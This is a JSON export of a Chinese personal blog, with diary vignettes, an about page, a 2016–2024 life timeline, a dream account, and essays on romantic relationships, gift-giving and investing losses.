{"meta":{"title":"命运石之门 - 用正确的方法做正确的事","subtitle":"","description":"","author":"哲学系老干部","url":"https://steinsgate.link","root":"/"},"pages":[{"title":"「我的札记」","date":"2024-02-25T06:05:07.215Z","updated":"2021-01-22T15:08:48.000Z","comments":true,"path":"20201114备份.html","permalink":"https://steinsgate.link/20201114%E5%A4%87%E4%BB%BD.html","excerpt":"以男孩视角记录本人经历的生活情感与思考。长期更新，最新20201114","text":"以男孩视角记录本人经历的生活情感与思考。长期更新，最新20201114 札记缘起我是一个孤独的男孩，在日常社交中大家并不喜欢我追求“真物”的沟通方式。他们常常喜欢简单轻松的沟通内容。因此为了保证日常生活的继续我只能选择封闭一部分内心的情感，那份被隐藏的情感时常令我倍感压抑。 直到有天，女友告诉我她想写言情小说书，可是不知怎么以第一人称的方式去写。我决定将我与女友第一次见面时的经历以第一人称的方式描写出来，供她写作参考。 在写作的过程中我感受到自己那份被隐藏的压抑情感，正在随着不断抒写到故事中的情绪而逐渐抚平，我的内心随着描写内容的深刻，而变得越来越平和。这对于一个时长压抑自己情感的人来说，无意让他感觉到自己的心灵得到了治愈。我将这个故事分享给了我的女友与朋友们，出乎意料的得到了大家一致的认可，这为我提供了宝贵的自信与勇气，我所以我决定写点什么。 因为不想干巴巴的记录自己的想法，还想让它更生动更有可读性，结果就是你现在看到的「我的札记」了，它成为了寄托我情感的产物。 札记中的男孩就是我，艺术加工仅仅是将我的情绪以“这个男孩”的角度描写出来，写述的情感、思考、场景，都是事实。 本人没有专门学习过文学写作，只有写逻辑严密的知识类文章的经验。文学作品只看过反乌托邦三部曲的《1984》，脑子里有个作者描写情绪的框架，所以就用这个框架描写了自己的情绪。 在此分享我为了帮助女友理解第一人称视角而写的，我与女友第一次见面时的经历年轻时的我们有过许多联结的瞬间。某天赴约见面，我们约好在高铁站会和。坐在通往高铁站的地铁椅子上我因为紧张，手心微微出汗，双手不自觉的紧紧握着行李箱上的拉杆，在内心想象着见面时可能会发生的各种情况。不安、喜悦、担心像一杯苦涩而甜美的鸡尾酒在心中交织在一起，描绘着一位年少单纯的纯情男孩此时此刻的心情。看到她了，脸颊不自觉的发热起来。我慢慢的，小心的靠近她，一步一步越来越近。我们的距离只有2m了，她还没有发现我。我的脑袋里飘过一句话「真的是个笨蛋」，随着我们的接近，喜悦心情无法掩盖的出现在我的笑容中。临近分开的时候，她坐在草坪旁的水泥围石边，今天的穿搭是一套纯净如天使般的白色连衣裙，搭配着灰色短款外套。小小的脑袋，娇小的身材，在那里蜷缩着身子，呆呆的望着手机。看着让人充满十足的保护欲，我多年的中二病又犯了，看着这么可爱的女孩子，内心仿佛在呐喊「以后的未来啊，这个姑娘要由我来守护」。ps～大概第一人称就这种感觉吧，我写的很糙，后续多看点文学作品就能打磨的更好 下面分享的就是正式内容「我的札记」 20201114 15:30安静的男孩与身边熙熙攘攘的人群好像是两个世界的人一般，显得格格不入。 今天他的情绪依然压抑、低落，悲伤的情绪像一把冰冷的铁链缠绕在男孩的心脏，缓缓的收紧，让心情变得更加压抑。男孩在肯德基靠近窗边的高椅上坐着，身前的餐桌上放着一杯美式咖啡，小臂靠在餐桌边角，望着透明玻璃外的人群来来往往，悲观的思考着一些东西。 爸爸，我姨姨的思维能力好低啊，数学题做的还没我快呢。男孩耳边传来来自一名小女孩幼气灵动的声音。男孩的思绪被打断，他缓缓的将头转向女孩的方向，注意力集中在了女孩身上。 女孩身边做着一位中年男士，穿着黑灰色的运动装，像是当季运动品牌店热销的流行款。用温柔耐心的语气跟女孩说，小慧，你看你姨姨小时候没有好好学习，所以现在她的思维能力才低，日子过的那么惨。 男孩听到这里心中一紧，难过的心情又涌现在脑海中，这可能戳到了他的痛处。很快注意力就回到了女孩与中年男士的沟通上。 中年男士用优越的语气回应道“你爸爸学生时期都是班里数学最好的人，别的同学不会的题，我看一眼就会了。还有一会进4000 的货，明天得赚1000多”“爸爸，好厉害啊”小女孩如此回应到。 小慧你看你刚刚吃饭就花了100，现在吃的这些花了29。“姨姨她一天的赚的连100都没有。”女孩如此说到。 男孩不禁有些悲哀“现在的孩子从这么小就已经接受社会的一套评判标准「金钱等于一切」，陷入了这个充满物化与追逐的社会游戏。” 熟悉的音乐响起，是手机的电话铃声。男孩的思绪回到生活，眼里多了一份坚定与光泽。穿上放在椅子边的蓝色羽绒服，夸上单肩包，轻轻的推出肯德基的玻璃门，去往了新的目的地。 20201114 23:32男孩将自己在肯德基的经历写成了故事分享给了身边的朋友。大家都给予了男孩非常友好的鼓励，无私的分享着对故事的建议。此时此刻男孩觉得自己找到了自信心的原动力，缠绕在心边的铁锁仿佛突然消失了一般。 男孩做梦也没有想到，自己写的故事，竟然可以得到那么多伙伴的认可。他发现世界上，与你不是情侣关系的普通异性朋友竟然可以这么善解人意，为你思考为你付出，不计回报。与她完全不同……男孩觉得他肯定会拥有比现在的她更加珍惜他的女孩子存在，这个女孩会欣赏他的闪光点，陪伴着他，理解他。终于他意识到了自己值得被爱，男孩在心底里感激这次经历出现，“谢谢这些对我善意的异性，让我知道了自己的美好，谢谢，谢谢，谢谢。” 她不珍惜我，没关系呀，她不理解我没关系呀，她作没关系呀，她和其他异性暧昧没关系呀，她的父母家庭反对没关系呀。不必担心不必自责，总会有珍惜你的人的，总会有笃信与你在一起的姑娘的。 你不用去学习怎么去追女孩，你只需要展现自己的闪光点，去吸引那些欣赏你的女孩。这样的爱情，互相吸引的感情才是你真正想要的，你想要的不是一段伪造的亲密关系，而是真正的互相吸引的彼此珍惜的亲密关系。 当男孩发现生活中朋友们对他的关怀与包容后，突然觉得世界如此美好。往日注意不到的朋友帮他夹菜的小行为在男孩眼中都闪闪发光——这些男孩曾经意识不到但确实存在的小细节，也变得令男孩心里暖洋洋的，像是换了个世界一般，充满阳光。 怀着喜悦的心情，在社交平台上分享了自己的心情，分享了一句他很喜欢的话「当我思考时，我又重新找回了自己」，这一刻他释然了。男孩不在沉迷于她的世界里因为她的行为而嫉妒难过。 去燃烧吧，去独自灿烂吧boy"},{"title":"","date":"2019-11-08T16:00:00.000Z","updated":"2024-02-25T09:24:30.353Z","comments":true,"path":"about.html","permalink":"https://steinsgate.link/about.html","excerpt":"","text":"关于我网名：哲学系老干部Birth: 2000-01-19简单介绍一下自己：一名终身学习者、希望有更多关注个人成长的小伙伴，一起互相交流学习，目前在学习前端编程。 兴趣: 增肌 &#x2F; 减脂 &#x2F; 马拉松 &#x2F; 阅读 &#x2F; 自我提升 &#x2F; 思考各种各样的事情爱好：ACG &#x2F; 日剧 &#x2F; 摄影 &#x2F; 兴趣：有深入科学的系统学习，积累到有一定专业性体系化知识的事物。爱好：娱乐休闲手段，并没有太深入的学习。 想对我进行更深入的了解？：我的故事 联系我：点击联系我练习项目：点击查看 目标 已达成 马拉松 减脂 增肌 投资从3000到10w 建立机房挖比特币 拥有自己的博客 学会基础的穿搭打扮 系统学习二语习得论，并完成了多个基础阶段的积累，词汇量达到12000。 未达成 英文原著阅读量达到1000w 学习前端编程 积累三年工作经验"},{"title":"文章归档","date":"2024-02-25T08:18:54.115Z","updated":"2023-03-15T02:21:32.000Z","comments":true,"path":"archives.html","permalink":"https://steinsgate.link/archives.html","excerpt":"","text":""},{"title":"","date":"2024-02-25T08:18:25.934Z","updated":"2022-02-05T04:44:18.000Z","comments":true,"path":"Links.html","permalink":"https://steinsgate.link/Links.html","excerpt":"","text":"我珍重的友谊，是一件艺术品被我从时间的浪沙中无意拾得挂在匆忙奔驰的生活驿车上有时几乎随风飘去，但并未失落又在偶然的遇合下被感情底手屡次发掘，越久远越觉得可贵因为其中回荡着我失去的青春又赋予我亲切的往事的回味受到书信和共感的细致的雕塑摆在窗口，不仅点缀寂寞而且象明镜般反映窗外的世界使那粗糙的世界显得如此柔和 友情链接 右下角有红色小飞机的友联，需要酸酸乳翻墙 社区"},{"title":"","date":"2019-11-08T16:00:00.000Z","updated":"2024-02-25T09:30:38.342Z","comments":true,"path":"guestbook.html","permalink":"https://steinsgate.link/guestbook.html","excerpt":"","text":"留言板 正因生来一无所有，因此我们能拥有一切。 ——「No Game No Life」 < 欢迎留言 > Bilibili | CloudMusic | Mail | QQ | Telegram | Weibo &nbsp"}],"posts":[{"title":"2016-2024时间流里的幻想奇点","slug":"2016-2024","date":"2024-02-24T16:00:00.000Z","updated":"2024-02-25T09:24:48.972Z","comments":true,"path":"2024/02/25/2016-2024/","link":"","permalink":"https://steinsgate.link/2024/02/25/2016-2024/","excerpt":"讲讲这些年的人生轨迹","text":"讲讲这些年的人生轨迹 谢谢你点开这篇文章，能对我的经历感到好奇，我很开心。这段经历对我来说至关重要，它们影响了我的一生。 科学分析我的成长案例2016.6以前，我对自己这辈子要做什么完全没有概念，我的自我还没有成形，也没有独立的认知。我没有明确的目标，我想要外界认为所有同龄男孩都会要的东西，也认同基因程序或社会环境的指令——换言之，迷迷糊糊地上学、找一份待遇不错的工作。 2016.6考试落榜后就失落了1个月，在8月份抓住了一个机会通过自己的技术赚了些钱。然后就在屋子里思考人生的意义，想要变得更好。因为不知道怎么去变得更好，就去百度 「如何让自己变得更好」 看到了阅读这个选项。就下定决心做进一步探索。于是，我在后来的时间里阅读了许多书籍，实践了许多自己想做的事，并向「终身学习者」的目标迈进。 在我的成长案例中，有个意外事件闯进了我的意识： 「虽然赚了许多钱，但是并没有因为钱而感到充实与快乐。想通过阅读丰富自己的精神」 一旦认知阅读，我就喜欢上了它，而且这次经历跟我一向喜欢做的事、对事物的探知求真精神，产生了共鸣。我觉得这是一次美好的经历，值得继续追寻，于是我把这次意外建构成一系列的目标——阅读学习更多的书，不断完善自己的认知，实现自我的超越。做一名终身学习者，而这些都成为我自我的主要成分。从那一刻开始，我的目标引导我把注意力集中于阅读与自我成长，形成一套循环的因果关系。最初，我是无意间发现阅读世界之美的，注意力帮助我重塑自我；后来，我刻意去追求自我成长的知识，自我就开始塑造注意力。我的成长例子并不特殊，很多人的注意力架构都是遵循同样的途径发展的。 2016-2019自我救赎的3年细节简述2016年考试落榜后，疯狂打游戏消沉了一个月。然后就遇到红利期搭建免流服务器，我看淘宝做的人很少，自己做了2个月捞金3w左右，第一个月自己做每天只睡3h，其余时间一直接单搭建服务器，教客户用，解决一些问题。感觉身体不行了，后一个月弄了个团队分工，后面看运营商开始打击了，就退场了。 2017年下半年做资金盘、分红盘、拆分盘、区块链、自己搭建机房挖比特币，从2000本金做到了10w投资本金，然后2018年中旬比特币大跌，周边币也都暴跌。我投资本金从10w亏到了3W，现在我静下心来好好学习，提升自我价值，我相信钱是解决问题后附带的东西。为了钱而钱是很难赚到钱的。我现在19，拥有人这一生最重要的资源，时间。 期间我分别开始了阅读、马拉松、投资、增肌、当健身助教这些我觉得很有趣的经历，就像《解忧杂货店》书中所说“正因为我的地图是一张白纸，这虽然很伤脑筋，但是正因为是一张白纸，才能随心所欲地绘制地图，一切全在自己，一切都是自由的，在你面前是无限的可能” 2016.6-至今 我的时间流2016年6月，暑假开始，同同学去嘉峪关旅游，临近往返时得知考试落榜。 2016年7、8月，疯狂玩电脑游戏，感觉流量不够用折腾学习了免流技术。 2016年9月，赶上免流量服务器风口，开了家淘宝店，赚了人生第一桶金3万。 2017年1月，免流服务器被运营商全力封杀，所以关闭了淘宝店。 2017年2、3月，有了一些钱的我不知道要做些什么才能成为更好的自己，去知乎了解到，读书或许是一个比较好开端，便去淘宝买了很多书疯狂阅读。 2017年4月，阅读了村上春树的《当我谈跑步时我谈些什么》，开始模仿村上春树跑步。 2017年6月，经过两个月的跑步训练，在兰州完成了人生第一场马拉松。 2017年8月，在鄂尔多斯完成了一场星空下的马拉松。 2017年9月，阅读了《穷爸爸富爸爸》理财书籍。带着3000本金，开始尝试互联网投资。 2017年10月，投资的虚拟币大跌，被长期套住。 2017年11月，阅读了《稀缺》《微习惯》等书，并重新收集了3000本金，投资了各种资金盘项目途中偶遇山寨币免费矿机活动，与同学交流并得到一些同学的帮助。 2017年12月，决心减肥，阅读了《我的最后一本减肥书》开始科学系统的减脂。并收获了总共10000多元投资收益。 2018年2月，初次投资的3000元虚拟币解套，利用16000多元本金，大举投资项目。 2018年3月，投资本金突破4w。 2018年4月，减肥成功体重从70kg减到了58kg。尝试考证。向信任我的朋友借了5w，项目投资金额达到10w。 2018年5月，投资本金依旧10w，尝试虚拟币挖矿行业，将更多的资金分配到虚拟币上。 2018年6月，和老同学跑了也许是最后一次一起跑的兰州马拉松。建设了机房，踏入区块链挖矿行业。 2018年7月，重新调整规划了人生目标。 2018年8月，阅读了《围城》对个人做事态度以及对未来的期望重新进行了反思。 2018年11月，比特币大跌，机房计划终止。 2019年4月，系统学习增肌参考资料《硬派健身》《施瓦辛格健身全书》《闪电增肌》《健身神话》《骨骼肌肉运动解剖》。 2019年6月，和健身房的专业私教进行了许多沟通，从结果上看对于训练时理论框架的刷新指导为0，确立了自身健身知识的专业系统性。 2019年6月，与朋友们去海南旅行，并拍摄并剪辑了第一部旅拍视频，受到了朋友的认可。 2019年7月，阅读了《原则》等书。 2019年8月，系统增肌5个月，全身肌肉得到了增长，身体变得肉眼可见的健硕。 2019年9月，阅读了《三体》，对人生有了更为广度的思考。 2019年11月，建立了基于Hexo框架的博客，并且重新部署布置了屋子变得更加舒适。 2019年12月，拍摄了第一支测试vlog，得到朋友的认可。 2020年5月，录制了第二支测试vlog，得到更好的认可，因对视频质量要求过硬，剪辑规划成本过高，决定停止对vlog视频的输出，未来择日再议。 2020年6月，进行了2周期的减脂训练体重从68.6kg➡️66.5kg；学习了化妆提升个体形象 2020年7月，去云南检验了自己的学习教育方面的认知；开始意识到「精神熵」学会在情感失序的时候通过减熵行为找回思维的秩序。对两性意义进行了许多思考与学习，写下了「本猛男自身对两性关系意义的探索报告」。 2020年8月，写出了两性中女性的一些相处特性；写出了情侣之间关于礼物的思考 2020年9月，去南京检验了自己的学习教育方面的认知； 2020年11月，去盐城检验了自己的学习教育方面的认知；开始写自己的札记。为什么写札记？因为写札记时减熵行为可以使我的情感思绪更为有秩序。 2021年2月至4月，系统学习二语习得论理论知识，打算从零培养英语能力。 2021年5月1日，开始实践二语习得论 2022年1月10日，一个非常重要的证考到了，并报取了更进阶的进行学习。 2022年1月31日，完成二语习得论第一阶段积累：罗塞塔石碑全部课程，开始进入第二阶段。（实际投入时间：205小时，词汇量测试:2440） 2022年11月19日，完成二语习得论第二阶段积累:书虫分级材料入门级到6级，开始进入第三阶段。（材料时间：247小时，实际投入时间：494小时，阅读量：153万，词汇量测试：5000） 2023年7月28日，完成二语习得论第三阶段积累:哈利波特全7册，开始进入第四阶段。（材料时间：125小时，实际投入时间250小时，阅读量：108万，词汇量测试：9000） 2024年21日，第四阶段积累现状：读完The Lord of the Rings四册全、Educated、The Great Gatsby、The Moon and Sixpence、becoming、Dreams from My Father、A Promised Land、Surely You’re Joking, Mr.Feynman!、Einstein: His Life and Universe，（材料时间：177.5小时，实际投入时间：355小时，阅读量171万，词汇量测试：12696）","categories":[{"name":"生活日常","slug":"生活日常","permalink":"https://steinsgate.link/categories/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"}],"tags":[{"name":"生活日常","slug":"生活日常","permalink":"https://steinsgate.link/tags/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"}]},{"title":"「我的札记」","slug":"20201114","date":"2020-11-13T16:00:00.000Z","updated":"2023-03-15T09:00:12.000Z","comments":true,"path":"2020/11/14/20201114/","link":"","permalink":"https://steinsgate.link/2020/11/14/20201114/","excerpt":"以男孩视角记录本人经历的生活情感与思考。","text":"以男孩视角记录本人经历的生活情感与思考。 札记缘起我是一个孤独的男孩，在日常社交中大家并不喜欢我追求“真物”的沟通方式。他们常常喜欢简单轻松的沟通内容。因此为了保证日常生活的继续我只能选择封闭一部分内心的情感，那份被隐藏的情感时常令我倍感压抑。 直到有天，女友告诉我她想写言情小说书，可是不知怎么以第一人称的方式去写。我决定将我与女友第一次见面时的经历以第一人称的方式描写出来，供她写作参考。 在写作的过程中我感受到自己那份被隐藏的压抑情感，正在随着不断抒写到故事中的情绪而逐渐抚平，我的内心随着描写内容的深刻，而变得越来越平和。这对于一个时长压抑自己情感的人来说，无意让他感觉到自己的心灵得到了治愈。我将这个故事分享给了我的女友与朋友们，出乎意料的得到了大家一致的认可，这为我提供了宝贵的自信与勇气，我所以我决定写点什么。 因为不想干巴巴的记录自己的想法，还想让它更生动更有可读性，结果就是你现在看到的「我的札记」了，它成为了寄托我情感的产物。 札记中的男孩就是我，艺术加工仅仅是将我的情绪以“这个男孩”的角度描写出来，写述的情感、思考、场景，都是事实。 本人没有专门学习过文学写作，只有写逻辑严密的知识类文章的经验。文学作品只看过反乌托邦三部曲的《1984》，脑子里有个作者描写情绪的框架，所以就用这个框架描写了自己的情绪。 在此分享我为了帮助女友理解第一人称视角而写的，我与女友第一次见面时的经历年轻时的我们有过许多联结的瞬间。某天赴约见面，我们约好在高铁站会和。坐在通往高铁站的地铁椅子上我因为紧张，手心微微出汗，双手不自觉的紧紧握着行李箱上的拉杆，在内心想象着见面时可能会发生的各种情况。不安、喜悦、担心像一杯苦涩而甜美的鸡尾酒在心中交织在一起，描绘着一位年少单纯的纯情男孩此时此刻的心情。看到她了，脸颊不自觉的发热起来。我慢慢的，小心的靠近她，一步一步越来越近。我们的距离只有2m了，她还没有发现我。我的脑袋里飘过一句话「真的是个笨蛋」，随着我们的接近，喜悦心情无法掩盖的出现在我的笑容中。临近分开的时候，她坐在草坪旁的水泥围石边，今天的穿搭是一套纯净如天使般的白色连衣裙，搭配着灰色短款外套。小小的脑袋，娇小的身材，在那里蜷缩着身子，呆呆的望着手机。看着让人充满十足的保护欲，我多年的中二病又犯了，看着这么可爱的女孩子，内心仿佛在呐喊「以后的未来啊，这个姑娘要由我来守护」。ps～大概第一人称就这种感觉吧，我写的很糙，后续多看点文学作品就能打磨的更好 下面分享的就是正式内容「我的札记」 20201114 15:30安静的男孩与身边熙熙攘攘的人群好像是两个世界的人一般，显得格格不入。 今天他的情绪依然压抑、低落，悲伤的情绪像一把冰冷的铁链缠绕在男孩的心脏，缓缓的收紧，让心情变得更加压抑。男孩在肯德基靠近窗边的高椅上坐着，身前的餐桌上放着一杯美式咖啡，小臂靠在餐桌边角，望着透明玻璃外的人群来来往往，悲观的思考着一些东西。 爸爸，我姨姨的思维能力好低啊，数学题做的还没我快呢。男孩耳边传来来自一名小女孩幼气灵动的声音。男孩的思绪被打断，他缓缓的将头转向女孩的方向，注意力集中在了女孩身上。 女孩身边做着一位中年男士，穿着黑灰色的运动装，像是当季运动品牌店热销的流行款。用温柔耐心的语气跟女孩说，小慧，你看你姨姨小时候没有好好学习，所以现在她的思维能力才低，日子过的那么惨。 男孩听到这里心中一紧，难过的心情又涌现在脑海中，这可能戳到了他的痛处。很快注意力就回到了女孩与中年男士的沟通上。 中年男士用优越的语气回应道“你爸爸学生时期都是班里数学最好的人，别的同学不会的题，我看一眼就会了。还有一会进4000 的货，明天得赚1000多”“爸爸，好厉害啊”小女孩如此回应到。 小慧你看你刚刚吃饭就花了100，现在吃的这些花了29。“姨姨她一天的赚的连100都没有。”女孩如此说到。 男孩不禁有些悲哀“现在的孩子从这么小就已经接受社会的一套评判标准「金钱等于一切」，陷入了这个充满物化与追逐的社会游戏。” 熟悉的音乐响起，是手机的电话铃声。男孩的思绪回到生活，眼里多了一份坚定与光泽。穿上放在椅子边的蓝色羽绒服，夸上单肩包，轻轻的推出肯德基的玻璃门，去往了新的目的地。","categories":[{"name":"生活日常","slug":"生活日常","permalink":"https://steinsgate.link/categories/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"}],"tags":[{"name":"生活日常","slug":"生活日常","permalink":"https://steinsgate.link/tags/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"},{"name":"生活日常：我的札记","slug":"生活日常：我的札记","permalink":"https://steinsgate.link/tags/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8%EF%BC%9A%E6%88%91%E7%9A%84%E6%9C%AD%E8%AE%B0/"}]},{"title":"昨晚做了个梦","slug":"20201105","date":"2020-11-04T16:00:00.000Z","updated":"2020-11-16T11:22:36.000Z","comments":true,"path":"2020/11/05/20201105/","link":"","permalink":"https://steinsgate.link/2020/11/05/20201105/","excerpt":"这个梦是俺醒来后，怕忘记，用20min时间趁着记忆还在火速还原出来的。事实上现在确实忘记了许多(ˊo̴̶̷̤ ̫ o̴̶̷̤ˋ)","text":"这个梦是俺醒来后，怕忘记，用20min时间趁着记忆还在火速还原出来的。事实上现在确实忘记了许多(ˊo̴̶̷̤ ̫ o̴̶̷̤ˋ) 我们生活在一个星球，这个星球需要通过购买光来生存。这个星球和一个非常神奇的宇宙引力场在一起共存着。有一天我们被告知有个彗星会经过星球，大家都没当事，因为彗星经过引力场是很正常的事情。所以夜晚我们坐在沙漠上仰望着星空，期待着彗星划过引力场的画面，据说非常漂亮。彗星来了它经过引力场时，散发出非常耀眼的浅蓝色光辉，优雅而绚丽超漂亮。就在大家都沉醉于彗星经过引力场的壮丽美景时，彗星的流向突然发生了改变。我们不知道彗星在引力场中经历了什么，只知道本来要经过星球的彗星向我们的星球以肉眼可见的速度接近放大，漂亮耀眼的浅蓝色光辉，也变成了醇厚的深红色，像是来自地狱的魔鬼，宣告着这个世界的终结。彗星撞击进星球后红光消失了，黑暗笼罩大地，虽然没有发生结构性的星球破坏，让我们很吃惊。可是我们的星球的温度开始逐渐降低，我们渐渐看不清眼前的物体是怎么样的形状，视界变低。我们选择了一个地图中最远的描点传送了过去，我们感受到自己的星球要进入下个沉睡了「地图已经看不见了，我们凭靠经验摸到了离彗星撞击地最远的描点」「实际上引力场之前我还在和怪兽打架，但是因为变身面具没有能量了需要恢复，就把面具就藏在了草丛里。」","categories":[{"name":"生活日常","slug":"生活日常","permalink":"https://steinsgate.link/categories/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"}],"tags":[{"name":"生活日常","slug":"生活日常","permalink":"https://steinsgate.link/tags/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"}]},{"title":"关于自身对两性关系意义的探索报告","slug":"20207015.1","date":"2020-08-18T15:59:59.000Z","updated":"2023-03-15T10:12:56.000Z","comments":true,"path":"2020/08/18/20207015.1/","link":"","permalink":"https://steinsgate.link/2020/08/18/20207015.1/","excerpt":"记录两性中的思考","text":"记录两性中的思考 20200712「关于自身对两性关系意义的探索报告」自成长以来我其实就是在不断的寻找个体的意义，企图实现自我的完善。 在一个偶然的机会下，阅读了个体心理学 阿德勒的书籍，从中得知了一个概念「人的烦恼来源于事业、社交、两性，而让人感到幸福的则是良好的社交关系。」，仔细想想生活中的各种问题深以为然。 对于事业与社交的意义，我已基本找到。而两性方面对我来说还是个未曾探索的未知领域。所以很巧，疫情期有幸有了对两性关系意义探寻的想法，也在此时很幸运的遇到了我的女友，正所谓合适的阶段遇到合适的你，哈哈哈。 和女友在一起后，我就正式开始了自身对于两性意义的探索。我企图运营出一个科学的、健康的、良性两性关系，这此时就是我所追求的两性关系意义。 以此为核心我展开了对两性关系的学习与尝试各种相处方式，例如:亲密关系或者成长性关系之类的相处模式。在此期间我付出许多时间与精力学习，并将学习到的相处模式实践在了我与女友身上。 女友在尝试这些相处模式的时候也有不开心不舒服的时候，所以在寻找两性意义的我，就把当不同阶段相处方式的意义与观念传达给了女友，女友也很配合我的所追求意义，因为我们都想要一个好的关系，非常感激女友的一路陪伴！ 在近6个月对两性意义的寻找与实践后，与女友一同经历了许多情感问题与调整。某天我与女友因沟通严肃问题，而压制情感不去表露的时候，我有了一些想法。 我开始想为什么我的情感被压制了会这么难受。结合过往经历思来想去，我终于觉悟了，我发现让我难受的点通常都与情感的联结度有关，也就是「陪伴」。复盘我的过往情感经验表明，只要情感联结稳定，那么我就不会翻来覆去睡不着的难受。 而我在关系里探索尝试不同的两性关系意义的过程中，其实本质上在不断的拷问自己现在的这段关系有意义吗？我们双方都感到满意吗？如果哪里没有做好那么你必须去学习塑造意义！这种不断的尝试让我的情感一直被某些东西压制着，所以我开始了思考，想了想压制我的正是我所追求的意义过程中所尝试的相处模式本身。 我就这样自己给自己制造压力，与此同时在尝试的过程中因为对于关系意义的不确定「因为还在探索过程中嘛」，所以我与女友的情感联结在我这里是不断变换的，这种变换极其难受。但是为了寻找真正的意义，我就挺过来了。 现在我首先感谢的就是在此过程中一直陪伴我的女友，也感谢那个挺过来的我。有了这些学习与尝试，我终于发现了我想要的两性关系中的「真物」，那就是「陪伴」一种稳定的情感联结，这种陪伴并非线下在身边的那种，而是心底里始终有女友，而女友心里也有我的那种感觉，这让我从心底里感觉踏实与喜悦。 这就是我，简单而复杂，复杂而坚定。 2020年7月12日，本猛男对于自身的两性关系意义探寻正式毕业。 「新开始」后续 结束孕育着新的开始，在上面我解决了自身对于两性关系意义的探索。我们彼此都有了明确的对关系的渴求，不在因探索意义而迷茫。现在我已经可以更加坚定的看待我与女友的关系。 而现在我与女友也打开了新的地图，开始相处出更好的关系打开不同的篇章，感谢陪伴过我，给予我鼓励与建议的朋友们，没有你们就没有现在的我的成长，感谢！ (=^▽^=)猛男与女友的故事还在继续...... 20200813嘿在恋爱的男孩，今日份对两性关系的思考女生有感而发的言语往往带有强烈的情绪煽动性，容易混淆扰乱男生心智，妨碍我们对关系的判断。我们看待一个人是否对关系真实，看的是他的行为与思维觉悟。男生如若通过只言片语来塑造自身对女孩的情感，则无善终。作为男生我们应该完善自身的能力，增强自身价值吸引力。万万不可，以女生为中心的去塑造自身价值。女生爱的是一个拥有「自我」的人，而非满足女生欲望的延续品。什么是爱？爱就是自爱的同时，对对方给予自身的善意为双方的成长提供能量。而不是在对方身上不断的索取，满足自身的欲望期待。爱是创造给予，而非消耗索取。男生可以和不爱你的姑娘在一起生活，但是要深知要自爱的基础上去给予对方自身的善意。对于不爱你却在一起相处的女生来说，作为男生在一段关系中要在自爱的基础上去给予对方成长的能量，这是对关系最高的重视与尊重的体现，已然是大德。不可因为女生的索取，而为了满足女生期待而丧失自我，乱了自身方寸，走上堕落迷失之路。男女本平等，奈何社会戾气太重，男生过度付出，女生大胆索取成为了一种常见的两性交往现象。 答应我别当舔狗好吗 请善待自己，对自己好一些 20200818关于情侣礼物的思考文章希望看了这篇文章可以替广大男&#x2F;女朋友彻底扫盲礼物这个东西，将注意力放到关系中最本质最美好的地方。不被物化的社会搞得原本美好的关系乌烟瘴气。情侣节日一开始的意义是体验交换物品给予带来的社交快乐。随着文化的推进，情侣节日的意义不在是单纯的体验交换物品的快乐。变化进阶为了确认彼此的感情心意的一种仪式。同时因为它是社会性活动，情侣都过，也顺势成为了一种情侣身份的象征活动。比如大家会在情侣节日问，你男&#x2F;女朋友给你送了什么东西这样子。如果没有礼物就会觉得感情哪里出了问题。女朋友想要礼物，不是说女友缺这个东西。而是想让男友回应一下自己对礼物的期待，表示情感的心意。而男友想要礼物，也是一样的。并不是男友买不起，而是男友也有对礼物的期待，想要确认女友的心意。我们这里谈一下二手礼物，买二手产品直接违背了传达一手心意的礼物本质。我们又不是买不起，不论是男友还是女友，省钱去买二手当礼物「哪怕几乎全新」，其实也显的没那么有诚意。会让人自然的想，我又不是买不起，看你还买二手，与其为难你确认心意，不如我自己买了。心意的确认本不分价格，但是二手这个特点就会放大礼物中物质的一面让彼此心存芥蒂。到此我们不得不谈一些关于礼物价格方面的问题。送礼的价格本质是为了在自己能力范围内给予心意，给予自己能给予的就可以了。万不可在别人给予你礼物的基础上再索要，索要如果在别人预算内还好说，可以满足你的任性。但是如果超出预算，其实也会放大礼物中物质的一面，让双方陷入对价格的计算中，脱离礼物是在能力范围内给予心意的本质，而去陷入她&#x2F;他为我多套xx钱就是对我不真诚的怪区。所以送礼价格方面请各自量力而为，接受别人给予的心意就可以了。「超出自身预算通过贷款借钱之类的送礼，其意义已经超过送礼本身了，更多的时候是一种传达自身对感情的重视忠诚的方式。不过需要注意的是这条仅仅在你确实知道对方经济状况买不起，但是为了你买了的情况下生效。其实只要对方送的礼品物质价值比你高，你都可以当为是对关系的重视的体现，不过没贷款那么极端。希望广大男&#x2F;女朋友不要把自己重要人对自己的重视当成理所当然，并且再次基础上更多的索取物质礼物，来满足自己的欲望。这样做的话就超出了礼物确认心意的本质，让礼物成为了一种物化的交易。双方送礼的物质价值最好相当，不要差太多就好，因为礼物除了心意的传达，也包含着对关系重视的程度。送的太便宜了，难免让男&#x2F;女方思考对方对关系没那么重视。男&#x2F;女朋友都是人，请给予平等的尊重。谁都没责任天生多付出。","categories":[{"name":"思考输出","slug":"思考输出","permalink":"https://steinsgate.link/categories/%E6%80%9D%E8%80%83%E8%BE%93%E5%87%BA/"}],"tags":[{"name":"思考输出：两性关系","slug":"思考输出：两性关系","permalink":"https://steinsgate.link/tags/%E6%80%9D%E8%80%83%E8%BE%93%E5%87%BA%EF%BC%9A%E4%B8%A4%E6%80%A7%E5%85%B3%E7%B3%BB/"}]},{"title":"对于投资的思考报告","slug":"20200716","date":"2020-07-15T16:00:00.000Z","updated":"2023-03-15T04:27:12.000Z","comments":true,"path":"2020/07/16/20200716/","link":"","permalink":"https://steinsgate.link/2020/07/16/20200716/","excerpt":"分享对于投资的思考与血泪经验","text":"分享对于投资的思考与血泪经验 20181104我的投资血泪经验 当我们不顾资产配置，而过于依赖一种资产，在巨大的风险来临时，巨大的财富将因此蒸发。 -重视资产配置 